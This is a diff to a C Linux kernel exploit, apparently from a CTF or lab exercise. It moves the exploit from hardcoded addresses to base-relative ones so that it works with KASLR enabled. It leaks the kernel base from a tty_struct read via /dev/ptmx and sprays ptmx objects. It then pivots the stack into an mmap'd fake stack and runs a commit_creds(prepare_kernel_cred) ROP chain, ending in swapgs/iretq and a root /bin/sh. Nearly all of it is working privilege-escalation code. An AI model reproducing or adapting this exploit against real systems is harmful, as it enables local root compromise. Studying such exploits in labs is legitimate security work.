@@ -2,7 +2,7 @@
  * stack_pivot:
  *   - SMEP is enabled
  *   - SMAP is disabled
- *   - KASLR is disabled
+ *   - KASLR is enabled
  *   - KPTI is disabled
  */
 
@@ -15,18 +15,17 @@
 
 #define ofs_tty_ops 0xc38880
 
-#define rop_mov_esp_0x39000000  0xffffffff815a9798 // mov esp, 0x39000000; ret;
-#define commit_creds            0xffffffff810744b0
-#define prepare_kernel_cred     0xffffffff81074650
-#define rop_pop_rdi             0xffffffff810d748d
-#define rop_mov_rdi_rax_rep_movsq 0xffffffff8162707b
-#define rop_swapgs              0xffffffff816266bc
-#define rop_iretq               0xffffffff81022dff
-#define rop_pop_rcx             0xffffffff8140c7b3
+#define rop_mov_esp_0x39000000	(kbase + 0x5a9798) // mov esp, 0x39000000; ret;
+#define commit_creds          	(kbase + 0x0744b0)
+#define prepare_kernel_cred   	(kbase + 0x074650)
+#define rop_pop_rdi           	(kbase + 0x0d748d)
+#define rop_mov_rdi_rax_rep_movsq (kbase + 0x62707b)
+#define rop_swapgs		(kbase + 0x6266bc)
+#define rop_iretq		(kbase + 0x022dff)
+#define rop_pop_rcx		(kbase + 0x40c7b3)
 
 unsigned long user_cs, user_ss, user_rsp, user_rflags;
 unsigned long kbase, g_buf;
-unsigned long *fake_stack;
 
 void fatal(const char *msg) {
   perror(msg);
@@ -40,7 +39,8 @@ static void win() {
   execve("/bin/sh", argv, envp);
 }
 
-void build_fake_stack(void){
+void build_fake_stack() {
+  unsigned long *fake_stack;
   fake_stack = mmap((void *)0x39000000 - 0x1000, 0x2000,
                         PROT_READ|PROT_WRITE|PROT_EXEC,
                         MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
@@ -78,7 +78,6 @@ static void save_state() {
 void main()
 {
   save_state();
-  build_fake_stack();
 
   int spray[100];
   for (int i = 0; i < 50; i++) {
@@ -97,11 +96,14 @@ void main()
       fatal("/dev/ptmx");
   }
 
-  // KASLR - actually KASLR is disabled in this one. Whatever.
+  // KASLR
   char buf[0x500];
   read(fd, buf, 0x500);
   kbase = *(unsigned long*)&buf[0x418] - ofs_tty_ops;
   printf("[+] kbase = 0x%016lx\n", kbase);
+
+  // build the fake stack in userspace memory - it uses kbase
+  build_fake_stack();
 
   // g_buf address leak
   g_buf = *(unsigned long*)&buf[0x438] - 0x438;
